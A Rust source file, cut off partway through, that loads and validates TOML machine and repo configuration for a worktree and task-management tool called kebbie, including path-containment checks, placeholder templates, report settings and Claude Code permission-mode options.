use std::path::{Component, Path, PathBuf};

use toml::{Table, Value};

use crate::repo::{main_checkout, name_of, slot_number, worktree_port};
use crate::sh::Result;
use crate::status::Group;

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Source {
    Local,
    Vault,
    Linear,
}

impl Source {
    pub const ALL: [Source; 3] = [Source::Local, Source::Vault, Source::Linear];

    pub fn key(self) -> &'static str {
        match self {
            Source::Local => "local",
            Source::Vault => "vault",
            Source::Linear => "linear",
        }
    }

    pub fn title(self) -> &'static str {
        match self {
            Source::Local => "local",
            Source::Vault => "vault",
            Source::Linear => "Linear",
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum Channel {
    Main,
    #[default]
    Release,
}

impl Channel {
    pub fn key(self) -> &'static str {
        match self {
            Channel::Main => "main",
            Channel::Release => "release",
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum AlsoNoticed {
    #[default]
    Backlog,
    Fix,
    Ask,
}

impl AlsoNoticed {
    pub const ALL: [AlsoNoticed; 3] = [AlsoNoticed::Backlog, AlsoNoticed::Fix, AlsoNoticed::Ask];

    pub fn key(self) -> &'static str {
        match self {
            AlsoNoticed::Backlog => "backlog",
            AlsoNoticed::Fix => "fix",
            AlsoNoticed::Ask => "ask",
        }
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum OngoingAt {
    #[default]
    Top,
    Bottom,
    Hidden,
}

impl OngoingAt {
    pub const ALL: [OngoingAt; 3] = [OngoingAt::Top, OngoingAt::Bottom, OngoingAt::Hidden];

    pub fn key(self) -> &'static str {
        match self {
            OngoingAt::Top => "top",
            OngoingAt::Bottom => "bottom",
            OngoingAt::Hidden => "hidden",
        }
    }
}

pub fn group_order(listed: &[Group]) -> Vec<Group> {
    listed.iter().copied().chain(Group::ALL.into_iter().filter(|group| !listed.contains(group))).collect()
}

pub const PERMISSION_MODES: [&str; 6] = ["default", "acceptEdits", "plan", "auto", "dontAsk", "bypassPermissions"];

pub fn permission_mode(name: &str) -> Result<&str> {
    PERMISSION_MODES.iter().find(|mode| **mode == name).map(|_| name)
        .ok_or(format!("\"{name}\" is not a Claude Code permission mode; use {}", PERMISSION_MODES.map(|mode| format!("\"{mode}\"")).join(", ")))
}

pub const DEFAULT_SETUP_SKILL: &str = "kebbie:set-up-worktree";
pub const DEFAULT_RULES_SKILL: &str = "kebbie:work-rules";
pub const DEFAULT_DEV_URL: &str = "http://localhost:{port}";
pub const DEFAULT_SERVER_NAME: &str = "server";
pub const DEFAULT_WORKER_NAME: &str = "worker";
const PLACEHOLDERS: [&str; 4] = ["worktree", "repo", "number", "port"];

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Worktree {
    pub setup_skill: Option<String>,
    pub setup_command: Option<String>,
    pub dev_server: Option<String>,
    pub dev_worker: Option<String>,
    pub dev_url: Option<String>,
    pub dev_route: Option<bool>,
    pub stage_on_main: Option<bool>,
    pub rules_skill: Option<String>,
    pub test_commands: Option<Vec<String>>,
    pub also_noticed: Option<AlsoNoticed>,
    pub permission_mode: Option<String>,
    pub profile: Option<String>,
    pub sandbox: Option<bool>,
    pub steps: Option<bool>,
    pub review_model: Option<String>,
    pub notify_command: Option<String>,
    pub vault_command: Option<String>,
    pub server_name: Option<String>,
    pub worker_name: Option<String>,
    pub ci_watch: Option<bool>,
    pub comments_watch: Option<bool>,
    pub comments_days: Option<u64>,
    pub clean_on_release: Option<Vec<String>>,
    pub docs_required: Option<bool>,
}

#[derive(Clone, Debug, Default, PartialEq)]
pub struct Machine {
    pub keys: Vec<(String, String)>,
    pub sources: Option<Vec<Source>>,
    pub groups: Option<Vec<Group>>,
    pub ongoing: Option<OngoingAt>,
    pub channel: Option<Channel>,
    pub restart: Restart,
    pub keeper: Option<bool>,
    pub recover: Option<bool>,
    pub machine_name: Option<String>,
    pub hub_url: Option<String>,
    pub report: Report,
    pub propose_issues: Option<bool>,
    pub worktree: Worktree,
}

pub const DEFAULT_HUB_URL: &str = "https://hub.kebbie.dev";
const REPORT_URL: &str = "https://issues.kebbie.dev";
const UNSENT_REPORT_URL: &str = "http://127.0.0.1:9";
pub const INBOX_TOKEN_PREFIX: &str = "kha_";

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub enum ReportText {
    #[default]
    Ask,
    Always,
    Never,
}

impl ReportText {
    pub const ALL: [ReportText; 3] = [ReportText::Ask, ReportText::Always, ReportText::Never];

    pub fn key(self) -> &'static str {
        match self {
            ReportText::Ask => "ask",
            ReportText::Always => "always",
            ReportText::Never => "never",
        }
    }
}

// The inbox token reads every allowed report on the issues endpoint, so Debug never prints it.
#[derive(Clone, Default, PartialEq)]
pub struct Report {
    pub enabled: Option<bool>,
    pub signals: Option<bool>,
    pub text: Option<ReportText>,
    pub inbox_token: Option<String>,
}

impl std::fmt::Debug for Report {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter.debug_struct("Report").field("enabled", &self.enabled).field("signals", &self.signals).field("text", &self.text).field("inbox_token", &self.inbox_token.as_ref().map(|_| "set")).finish()
    }
}

// enabled = false, from before signals and text were two keys, still turns both off.
impl Report {
    // Every cargo test, unit and spawned binary alike, runs a debug build, so only a release build can reach the production endpoint.
    pub fn url(&self) -> &str {
        if cfg!(debug_assertions) { UNSENT_REPORT_URL } else { REPORT_URL }
    }

    pub fn signals(&self) -> bool {
        self.signals.or(self.enabled).unwrap_or(true)
    }

    pub fn text(&self) -> ReportText {
        self.text.unwrap_or(if self.enabled == Some(false) { ReportText::Never } else { ReportText::Ask })
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq)]
pub struct Restart {
    pub idle_minutes: Option<u64>,
    pub auto: Option<bool>,
}

pub const DEFAULT_IDLE_MINUTES: u64 = 10;

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Layer {
    Repo,
    Machine,
    Default,
}

impl Layer {
    pub fn label(self) -> &'static str {
        match self {
            Layer::Repo => "repo config",
            Layer::Machine => "machine config",
            Layer::Default => "default",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Scope {
    Either,
    Machine,
    Repo,
}

#[derive(Clone, Debug, PartialEq)]
pub enum Kind {
    Bool,
    Choice(Vec<&'static str>),
    Text,
    Number,
    List,
    Skill,
    Secret,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Entry {
    pub key: &'static str,
    pub value: String,
    pub layer: Layer,
    pub kind: Kind,
    pub scope: Scope,
    pub about: String,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Setting<T> {
    pub value: T,
    pub layer: Layer,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Settings {
    pub sources: Setting<Vec<Source>>,
    pub groups: Setting<Vec<Group>>,
    pub ongoing: Setting<OngoingAt>,
    pub setup_skill: Setting<String>,
    pub setup_command: Setting<Option<String>>,
    pub dev_server: Setting<Option<String>>,
    pub dev_worker: Setting<Option<String>>,
    pub dev_url: Setting<Option<String>>,
    pub dev_route: Setting<bool>,
    pub stage_on_main: Setting<bool>,
    pub rules_skill: Setting<String>,
    pub test_commands: Setting<Vec<String>>,
    pub also_noticed: Setting<AlsoNoticed>,
    pub permission_mode: Setting<Option<String>>,
    pub profile: Setting<Option<String>>,
    pub sandbox: Setting<bool>,
    pub steps: Setting<bool>,
    pub review_model: Setting<Option<String>>,
    pub notify_command: Setting<Option<String>>,
    pub vault_command: Setting<Option<String>>,
    pub server_name: Setting<String>,
    pub worker_name: Setting<String>,
    pub channel: Setting<Channel>,
    pub idle_minutes: Setting<u64>,
    pub auto_restart: Setting<bool>,
    pub ci_watch: Setting<bool>,
    pub comments_watch: Setting<bool>,
    pub comments_days: Setting<u64>,
    pub clean_on_release: Setting<Vec<String>>,
    pub docs_required: Setting<bool>,
    pub keeper: Setting<bool>,
    pub recover: Setting<bool>,
    pub machine_name: Setting<String>,
    pub hub_url: Setting<String>,
    pub report_signals: Setting<bool>,
    pub report_text: Setting<ReportText>,
    pub report_inbox: Setting<bool>,
    pub propose_issues: Setting<bool>,
}

pub struct Loaded {
    pub machine: PathBuf,
    pub repo: Option<PathBuf>,
    pub settings: Settings,
}

pub fn dir() -> PathBuf {
    std::env::var("XDG_CONFIG_HOME").map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(".config"))
        .join("kebbie")
}

pub fn path() -> PathBuf {
    std::env::var("KEBBIE_CONFIG").map(PathBuf::from).unwrap_or_else(|_| dir().join("config.toml"))
}

pub fn repos_dir() -> PathBuf {
    std::env::var("KEBBIE_REPOS_DIR").map(PathBuf::from).unwrap_or_else(|_| dir().join("repos"))
}

// A worktree shares its main checkout's file, since the file is named after the main checkout's folder.
pub fn repo_file_in(dir: &Path, repo: &Path) -> PathBuf {
    let main = main_checkout(repo).unwrap_or_else(|_| repo.to_path_buf());
    dir.join(format!("{}.toml", name_of(&main)))
}

pub fn repo_file(repo: &Path) -> PathBuf {
    repo_file_in(&repos_dir(), repo)
}

pub fn shown(path: &Path) -> String {
    let found = if path.exists() { "found" } else { "not found" };
    match std::fs::read_link(path) {
        Ok(target) => format!("{} -> {} ({found})", path.display(), path.parent().map_or(target.clone(), |parent| parent.join(&target)).display()),
        Err(_) => format!("{} ({found})", path.display()),
    }
}

fn read(path: &Path) -> Result<Option<String>> {
    match std::fs::read_to_string(path) {
        Ok(text) => Ok(Some(text)),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(error) => Err(format!("{}: {error}", path.display())),
    }
}

pub fn load_machine(path: &Path) -> Result<Machine> {
    check_machine(path).map(|(machine, unknown)| warn_once(machine, &unknown))
}

pub fn load_repo(path: &Path) -> Result<Worktree> {
    check_repo(path).map(|(worktree, unknown)| warn_once(worktree, &unknown))
}

pub fn check_machine(path: &Path) -> Result<(Machine, Vec<String>)> {
    let source = path.display().to_string();
    read(path)?.map_or(Ok((Machine::default(), Vec::new())), |text| Ok((parse_machine(&text, &source)?, unknown_in_file(&text, &source, &MACHINE_KEYS))))
}

pub fn check_repo(path: &Path) -> Result<(Worktree, Vec<String>)> {
    let source = path.display().to_string();
    read(path)?.map_or(Ok((Worktree::default(), Vec::new())), |text| Ok((parse_repo(&text, &source)?, unknown_in_file(&text, &source, &REPO_KEYS))))
}

pub const UNKNOWN_FIX: &str = "a newer kebbie may know it; kebbie update";

static QUIET: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

pub fn report_unknown_keys_quietly() {
    QUIET.store(true, std::sync::atomic::Ordering::Relaxed);
}

fn warn_once<T>(value: T, unknown: &[String]) -> T {
    static WARNED: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());
    if QUIET.load(std::sync::atomic::Ordering::Relaxed) {
        return value;
    }
    let mut warned = WARNED.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    for line in unknown.iter().filter(|line| !warned.contains(line)).cloned().collect::<Vec<_>>() {
        eprintln!("kebbie: {line} (ignored: {UNKNOWN_FIX}, or fix the spelling)");
        warned.push(line);
    }
    value
}

const MACHINE_KEYS: [&str; 18] = ["board", "worktree", "task", "review", "notify", "vault", "update", "restart", "keeper", "recover", "machine", "hub", "keys", "ci", "comments", "routines", "report", "issues"];
const REPO_KEYS: [&str; 8] = ["actions", "worktree", "task", "review", "ci", "comments", "docs", "routines"];
const SECTION_KEYS: [(&str, &[&str]); 18] = [
    ("board", &["groups", "backlog"]),
    ("board.backlog", &["sources", "ongoing"]),
    ("update", &["channel"]),
    ("restart", &["idle_minutes", "auto"]),
    ("keeper", &["enabled"]),
    ("recover", &["enabled"]),
    ("report", &["signals", "text", "enabled", "inbox_token"]),
    ("issues", &["propose"]),
    ("machine", &["name"]),
    ("hub", &["url"]),
    ("worktree", &["setup_skill", "setup_command", "dev_server", "dev_worker", "dev_url", "dev_route", "stage_on_main", "server_name", "worker_name", "clean_on_release"]),
    ("task", &["rules_skill", "test_commands", "also_noticed", "permission_mode", "profile", "sandbox", "steps"]),
    ("review", &["model"]),
    ("notify", &["command"]),
    ("vault", &["command"]),
    ("ci", &["watch"]),
    ("comments", &["watch", "watch_days"]),
    ("docs", &["required"]),
];

fn unknown_in(table: &Table, prefix: &str, known: &[&str]) -> Vec<String> {
    table.keys().filter(|key| !known.contains(&key.as_str())).map(|key| format!("{prefix}{key}: unknown key; known keys here: {}", known.join(", "))).collect()
}

pub fn unknown_keys(table: &Table, prefix: &str, known: &[&str]) -> Result<()> {
    unknown_in(table, prefix, known).into_iter().next().map_or(Ok(()), Err)
}

// A key a settings parser reads but SECTION_KEYS lacks is warned about while still read, so add every new key here too.
fn unknown_settings(table: &Table, top: &[&str]) -> Vec<String> {
    let sections = SECTION_KEYS.iter().filter_map(|(path, known)| path.split('.').try_fold(table, |table, key| table.get(key)?.as_table()).map(|section| unknown_in(section, &format!("{path}."), known)));
    unknown_in(table, "", top).into_iter().chain(sections.flatten()).collect()
}

fn unknown_in_file(text: &str, source: &str, top: &[&str]) -> Vec<String> {
    text.parse::<Table>().map(|table| unknown_settings(&table, top).into_iter().map(|line| format!("{source}: {line}")).collect()).unwrap_or_default()
}

fn subtable<'a>(table: &'a Table, key: &str, name: &str) -> Result<Option<&'a Table>> {
    table.get(key).map(|value| value.as_table().ok_or(format!("{name}: must be a table"))).transpose()
}

fn strings(value: &Value, key: &str) -> Result<Vec<String>> {
    let items = value.as_array().ok_or(format!("{key}: must be a list of strings"))?;
    items.iter().map(|item| item.as_str().map(str::to_string).ok_or(format!("{key}: must be a list of strings"))).collect()
}

// A path a repo config names stays inside the repo: relative, with no .. in it.
pub fn inside(path: &str) -> bool {
    let path = Path::new(path);
    !path.as_os_str().is_empty() && path.components().all(|part| matches!(part, Component::Normal(_) | Component::CurDir))
}

// A skill is a folder name, after its plugin's name and a colon or alone, so it never walks out of a skills folder.
pub fn skill_name(name: &str) -> bool {
    let (plugin, skill) = name.split_once(':').unwrap_or(("own", name));
    [plugin, skill].iter().all(|part| !part.is_empty() && *part != "." && *part != ".." && !part.contains(['/', '\\', ':']))
}

// A skill setting may name a Markdown file instead, by an absolute path or one under ~.
pub fn skill_path(value: &str) -> Option<PathBuf> {
    let path = match value.strip_prefix("~/") {
        Some(rest) => PathBuf::from(std::env::var("HOME").ok().filter(|home| !home.is_empty())?).join(rest),
        None if value.starts_with('/') => PathBuf::from(value),
        None => return None,
    };
    Some(path)
}

pub fn quoted_file(path: &Path) -> Result<String> {
    std::fs::read_to_string(path).map(|text| format!("--- {} ---\n{}\n--- end of {} ---", path.display(), text.trim_end(), path.display())).map_err(|error| format!("{}: {error}", path.display()))
}

fn markdown(value: &str) -> bool {
    (value.starts_with('/') || value.starts_with("~/")) && Path::new(value).extension().is_some_and(|extension| extension.eq_ignore_ascii_case("md"))
}

pub fn follow(value: &str) -> String {
    match skill_path(value) {
        Some(path) => format!("read `{}` and follow it", path.display()),
        None => format!("run the skill `{value}` and follow it"),
    }
}

pub fn rules_named(value: &str) -> String {
    match skill_path(value) {
        Some(path) => format!("the rules in `{}`", path.display()),
        None => format!("the skill `{value}`"),
    }
}

fn skill(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let name = text(table, field, key)?;
    match name {
        Some(name) if !skill_name(&name) && !markdown(&name) => Err(format!("{key}: \"{name}\" is not a skill name or a Markdown file; use <skill>, <plugin>:<skill>, or a path to a .md file starting with / or ~/")),
        name => Ok(name),
    }
}

fn text(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let Some(value) = table.get(field) else { return Ok(None) };
    match value.as_str().map(str::trim) {
        Some("") => Err(format!("{key}: must not be empty")),
        Some(text) => Ok(Some(text.to_string())),
        None => Err(format!("{key}: must be a string")),
    }
}

enum Piece<'a> {
    Text(&'a str),
    Field(&'a str),
}

fn pieces(template: &str) -> Result<Vec<Piece<'_>>> {
    let mut pieces = Vec::new();
    let mut rest = template;
    while let Some(open) = rest.find('{') {
        pieces.push(Piece::Text(&rest[..open]));
        let close = rest[open..].find('}').ok_or(format!("{template:?} opens a {{ it never closes"))? + open;
        let name = &rest[open + 1..close];
        if !PLACEHOLDERS.contains(&name) {
            return Err(format!("{{{name}}} is not a placeholder; use {{worktree}}, {{repo}}, {{number}} or {{port}}"));
        }
        pieces.push(Piece::Field(name));
        rest = &rest[close + 1..];
    }
    pieces.push(Piece::Text(rest));
    Ok(pieces)
}

// An empty template is kept, since it is how dev_url turns the link off.
fn template(table: &Table, field: &str, key: &str) -> Result<Option<String>> {
    let Some(value) = table.get(field) else { return Ok(None) };
    let text = value.as_str().ok_or(format!("{key}: must be a string"))?.trim();
    pieces(text).map_err(|error| format!("{key}: {error}"))?;
    Ok(Some(text.to_string()))
}

pub struct Place {
    pub worktree: String,
    pub repo: String,
    pub number: Option<usize>,
    pub port: Option<u16>,
}

pub fn expand(template: &str, place: &Place) -> Option<String> {
    let parts: Option<Vec<String>> = pieces(template).ok()?.into_iter().map(|piece| match piece {
        Piece::Text(text) => Some(text.to_string()),
        Piece::Field("worktree") => Some(place.worktree.clone()),
        Piece::Field("repo") => Some(place.repo.clone()),
        Piece::Field("number") => place.number.map(|number| number.to_string()),
        Piece::Field(_) => place.port.map(|port| port.to_string()),
    }).collect();
    Some(parts?.concat()).filter(|url| !url.is_empty())
}

pub fn dev_url(template: Option<&str>, repo: &Path, worktree: &Path) -> Option<String> {
    let template = template?;
    let port = if template.contains("{port}") { worktree_port(worktree) } else { None };
    expand(template, &Place { worktree: name_of(worktree), repo: name_of(repo), number: slot_number(repo, worktree), port })
}

fn backlog_sources(backlog: &Table) -> Result<Option<Vec<Source>>> {
    let Some(value) = backlog.get("sources") else { return Ok(None) };
    let mut found = Vec::new();
    for name in strings(value, "board.backlog.sources")? {
        let source = Source::ALL.into_iter().find(|source| source.key() == name)
            .ok_or(format!("board.backlog.sources: \"{name}\" is not a source; use \"local\", \"vault\" or \"linear\""))?;
        if found.contains(&source) {
            return Err(format!("board.backlog.sources: \"{name}\" is listed twice"));
        }
        found.push(source);
    }
    Ok(Some(found))
}

fn groups(value: &Value) -> Result<Vec<Group>> {
    let mut found = Vec::new();
    for name in strings(value, "board.groups")? {
        let name = if name == "to-review" { "in-review".to_string() } else { name };
        let group = Group::ALL.into_iter().find(|group| group.key() == name)
            .ok_or(format!("board.groups: \"{name}\" is not a group; use {}", Group::ALL.map(|group| format!("\"{}\"", group.key())).join(", ")))?;
        if found.contains(&group) {
            return Err(format!("board.groups: \"{name}\" is listed twice"));
        }
        found.push(group);
    }
    Ok(found)
}

fn ongoing_at(backlog: &Table) -> Result<Option<OngoingAt>> {
    let Some(name) = text(backlog, "ongoing", "board.backlog.ongoing")? else { return Ok(None) };
    OngoingAt::ALL.into_iter().find(|at| at.key() == name).map(Some)
        .ok_or(format!("board.backlog.ongoing: \"{name}\" is not a place; use \"top\", \"bottom\" or \"hidden\""))
}

#[derive(Default)]
struct Board {
    sources: Option<Vec<Source>>,
    groups: Option<Vec<Group>>,
    ongoing: Option<OngoingAt>,
}

fn board(table: &Table) -> Result<Board> {
    let Some(board) = subtable(table, "board", "board")? else { return Ok(Board::default()) };
    let groups = board.get("groups").map(groups).transpose()?;
    let Some(backlog) = subtable(board, "backlog", "board.backlog")? else { return Ok(Board { groups, ..Board::default() }) };
    Ok(Board { sources: backlog_sources(backlog)?, groups, ongoing: ongoing_at(backlog)? })
}

fn update(table: &Table) -> Result<Option<Channel>> {
    let Some(update) = subtable(table, "update", "update")? else { return Ok(None) };
    match text(update, "channel", "update.channel")?.as_deref() {
        None => Ok(None),
        Some("main") => Ok(Some(Channel::Main)),
        Some("release") => Ok(Some(Channel::Release)),
        Some(other) => Err(format!("update.channel: \"{other}\" is not a channel; use \"main\" or \"release\"")),
    }
}

// The board's keys are checked against each other in keys.rs, where a bad entry is left out rather than failing the file.
fn keys(table: &Table) -> Result<Vec<(String, String)>> {
    let Some(keys) = subtable(table, "keys", "keys")? else { return Ok(Vec::new()) };
    Ok(keys.iter().map(|(name, value)| (name.clone(), value.as_str().map_or_else(|| format!("{} {}", value.type_str(), "value"), str::to_string))).collect())
}

fn restart(table: &Table) -> Result<Restart> {
    let Some(restart) = subtable(table, "restart", "restart")? else { return Ok(Restart::default()) };
    let idle_minutes = match restart.get("idle_minutes") {
        None => None,
        Some(value) => Some(value.as_integer().filter(|minutes| (1..=1440).contains(minutes)).ok_or("restart.idle_minutes: must be a whole number of minutes, 1 to 1440")? as u64),
    };
    let auto = restart.get("auto").map(|value| value.as_bool().ok_or("restart.auto: must be true or false")).transpose()?;
    Ok(Restart { idle_minutes, auto })
}

fn propose_issues(table: &Table) -> Result<Option<bool>> {
    let Some(section) = subtable(table, "issues", "issues")? else { return Ok(None) };
    section.get("propose").map(|value| value.as_bool().ok_or_else(|| "issues.propose: must be true or false".to_string())).transpose()
}

fn enabled_in(table: &Table, name: &str) -> Result<Option<bool>> {
    let Some(section) = subtable(table, name, name)? else { return Ok(None) };
    section.get("enabled").map(|value| value.as_bool().ok_or_else(|| format!("{name}.enabled: must be true or false"))).transpose()
}

fn report(table: &Table) -> Result<Report> {
    let Some(report) = subtable(table, "report", "report")? else { return Ok(Report::default()) };
    let enabled = report.get("enabled").map(|value| value.as_bool().ok_or("report.enabled: must be true or false")).transpose()?;
    let signals = report.get("signals").map(|value| value.as_bool().ok_or("report.signals: must be true or false")).transpose()?;
    let text = report.get("text").map(|value| value.as_str().and_then(|given| ReportText::ALL.into_iter().find(|mode| mode.key() == given)).ok_or("report.text: must be \"ask\", \"always\" or \"never\"")).transpose()?;
    let inbox_token = match report.get("inbox_token") {
        None => None,
        Some(value) => Some(value.as_str().map(str::trim).filter(|token| token.starts_with(INBOX_TOKEN_PREFIX) && token.len() > INBOX_TOKEN_PREFIX.len()).ok_or("report.inbox_token: must be the kha_ token the issues endpoint issued")?.to_string()),
    };
    Ok(Report { enabled, signals, text, inbox_token })
}

fn hub_url(table: &Table) -> Result<Option<String>> {
    let Some(hub) = subtable(table, "hub", "hub")? else { return Ok(None) };
    text(hub, "url", "hub.url")?.map(|url| crate::hub::hub_url(&url).map_err(|error| format!("hub.url: {error}"))).transpose()
}

fn machine_name(table: &Table) -> Result<Option<String>> {
    let Some(machine) = subtable(table, "machine", "machine")? else { return Ok(None) };
    let Some(value) = machine.get("name") else { return Ok(None) };
    valid_machine_name(value.as_str().ok_or("machine.name: must be a string")?).map(Some)
}

// The hub refuses a name past 64 characters, so config.toml does too.
pub const MACHINE_NAME_CHARS: usize = 64;

pub fn valid_machine_name(text: &str) -> Result<String> {
    let name = text.trim();
    if name.is_empty() || name.chars().count() > MACHINE_NAME_CHARS || name.chars().any(char::is_control) {
        return Err(format!("machine.name: must be a non-empty string of at most {MACHINE_NAME_CHARS} characters, without control characters such as a tab or a newline"));
    }
    if name.eq_ignore_ascii_case("localhost") {
        return Err("machine.name: \"localhost\" names every machine; give this one a name of its own, such as \"mac\" or \"devbox\"".to_string());
    }
    Ok(name.to_string())
}

// The host's name up to its first dot, as `hostname -s` gives it.
pub fn short_hostname() -> String {
    let mut buffer = [0u8; 256];
    // SAFETY: gethostname writes at most buffer.len() bytes into the buffer this frame owns.
    let named = unsafe { libc::gethostname(buffer.as_mut_ptr().cast(), buffer.len()) } == 0;
    let end = buffer.iter().position(|byte| *byte == 0).unwrap_or(buffer.len());
    let name = if named { String::from_utf8_lossy(&buffer[..end]).to_string() } else { String::new() };
    let short = name.split('.').next().unwrap_or_default().trim().to_string();
    if short.is_empty() { "this-machine".to_string() } else { short }
}

fn worktree(table: &Table) -> Result<Worktree> {
    let Some(worktree) = subtable(table, "worktree", "worktree")? else { return Ok(Worktree::default()) };
    Ok(Worktree {
        setup_skill: skill(worktree, "setup_skill", "worktree.setup_skill")?,
        setup_command: text(worktree, "setup_command", "worktree.setup_command")?,
        dev_server: text(worktree, "dev_server", "worktree.dev_server")?,
        dev_worker: text(worktree, "dev_worker", "worktree.dev_worker")?,
        dev_url: template(worktree, "dev_url", "worktree.dev_url")?,
        dev_route: worktree.get("dev_route").map(|value| value.as_bool().ok_or("worktree.dev_route: must be true or false")).transpose()?,
        stage_on_main: worktree.get("stage_on_main").map(|value| value.as_bool().ok_or("worktree.stage_on_main: must be true or false")).transpose()?,
        rules_skill: None,
        test_commands: None,
        also_noticed: None,
        permission_mode: None,
        profile: None,
        sandbox: None,
        steps: None,
        review_model: None,
        notify_command: None,
        vault_command: None,
        server_name: text(worktree, "server_name", "worktree.server_name")?,
        worker_name: text(worktree, "worker_name", "worktree.worker_name")?,
        ci_watch: None,
        comments_watch: None,
        comments_days: None,
        clean_on_release: worktree.get("clean_on_release").map(clean_on_release).transpose()?,
        docs_required: None,
    })
}

// Folders inside the worktree only: a path that climbs out or starts at / could reach anything.
fn clean_on_release(value: &Value) -> Result<Vec<String>> {
    let folders = strings(value, "worktree.clean_on_release")?;
    for folder in &folders {
        let inside = !folder.trim().is_empty() && Path::new(folder).components().all(|part| matches!(part, Component::Normal(name) if name != ".git"));
        if !inside {
            return Err(format!("worktree.clean_on_release: \"{folder}\" must be a folder inside the worktree, such as \"target\" or \"node_modules/.cache\""));
        }
    }
    Ok(folders)
}

fn with_task(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(task) = subtable(table, "task", "task")? {
        worktree.rules_skill = skill(task, "rules_skill", "task.rules_skill")?;
        worktree.test_commands = task.get("test_commands").map(test_commands).transpose()?;
        worktree.also_noticed = also_noticed(task)?;
        worktree.permission_mode = text(task, "permission_mode", "task.permission_mode")?
            .map(|mode| permission_mode(&mode).map(str::to_string).map_err(|error| format!("task.permission_mode: {error}"))).transpose()?;
        worktree.profile = text(task, "profile", "task.profile")?
            .map(|profile| crate::profiles::name(&profile).map(str::to_string).map_err(|error| format!("task.profile: {error}"))).transpose()?;
        worktree.sandbox = task.get("sandbox").map(|value| value.as_bool().ok_or("task.sandbox: must be true or false")).transpose()?;
        worktree.steps = task.get("steps").map(|value| value.as_bool().ok_or("task.steps: must be true or false")).transpose()?;
    }
    Ok(worktree)
}

fn also_noticed(task: &Table) -> Result<Option<AlsoNoticed>> {
    let Some(name) = text(task, "also_noticed", "task.also_noticed")? else { return Ok(None) };
    AlsoNoticed::ALL.into_iter().find(|choice| choice.key() == name).map(Some)
        .ok_or(format!("task.also_noticed: \"{name}\" is not a choice; use \"backlog\", \"fix\" or \"ask\""))
}

fn test_commands(value: &Value) -> Result<Vec<String>> {
    let commands = strings(value, "task.test_commands")?;
    match commands.iter().find(|command| command.trim().is_empty()) {
        Some(_) => Err("task.test_commands: a command must not be empty".to_string()),
        None => Ok(commands.iter().map(|command| command.trim().to_string()).collect()),
    }
}

fn with_review(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(review) = subtable(table, "review", "review")? {
        worktree.review_model = text(review, "model", "review.model")?;
    }
    Ok(worktree)
}

fn with_notify(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(notify) = subtable(table, "notify", "notify")? {
        worktree.notify_command = text(notify, "command", "notify.command")?;
    }
    Ok(worktree)
}

fn with_vault(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(vault) = subtable(table, "vault", "vault")? {
        worktree.vault_command = text(vault, "command", "vault.command")?;
    }
    Ok(worktree)
}

fn with_ci(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(ci) = subtable(table, "ci", "ci")? {
        worktree.ci_watch = ci.get("watch").map(|value| value.as_bool().ok_or("ci.watch: must be true or false")).transpose()?;
    }
    Ok(worktree)
}

fn with_comments(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(comments) = subtable(table, "comments", "comments")? {
        worktree.comments_watch = comments.get("watch").map(|value| value.as_bool().ok_or("comments.watch: must be true or false")).transpose()?;
        worktree.comments_days = comments.get("watch_days").map(|value| value.as_integer().filter(|days| (1..=90).contains(days)).map(|days| days as u64).ok_or("comments.watch_days: must be a whole number of days, 1 to 90")).transpose()?;
    }
    Ok(worktree)
}

fn with_docs(table: &Table, mut worktree: Worktree) -> Result<Worktree> {
    if let Some(docs) = subtable(table, "docs", "docs")? {
        worktree.docs_required = docs.get("required").map(|value| value.as_bool().ok_or("docs.required: must be true or false")).transpose()?;
    }
    Ok(worktree)
}

fn layers(table: &Table) -> Result<Worktree> {
    worktree(table).and_then(|worktree| with_task(table, worktree)).and_then(|worktree| with_review(table, worktree)).and_then(|worktree| with_notify(table, worktree)).and_then(|worktree| with_vault(table, worktree)).and_then(|worktree| with_ci(table, worktree)).and_then(|worktree| with_comments(table, worktree)).and_then(|worktree| with_docs(table, worktree))
}

fn table(text: &str, source: &str) -> Result<Table> {
    text.parse().map_err(|error: toml::de::Error| format!("{source}: {}", error.to_string().trim()))
}

pub fn parse_machine(text: &str, source: &str) -> Result<Machine> {
    let table = table(text, source)?;
    let fail = |error: String| format!("{source}: {error}");
    if table.contains_key("docs") {
        return Err(fail(format!("docs.required: each repo opts in on its own, so it lives in its repo config; set it in {}/<repo>.toml", repos_dir().display())));
    }
    let worktree = layers(&table).map_err(fail)?;
    if worktree.dev_route.is_some() {
        return Err(fail(format!("worktree.dev_route: each repo opts in on its own, so it lives in its repo config; set it in {}/<repo>.toml", repos_dir().display())));
    }
    if worktree.stage_on_main.is_some() {
        return Err(fail(format!("worktree.stage_on_main: each repo opts in on its own, so it lives in its repo config; set it in {}/<repo>.toml", repos_dir().display())));
    }
    crate::routines::parse_list(&table, None, source).map_err(fail)?;
    let Board { sources, groups, ongoing } = board(&table).map_err(fail)?;
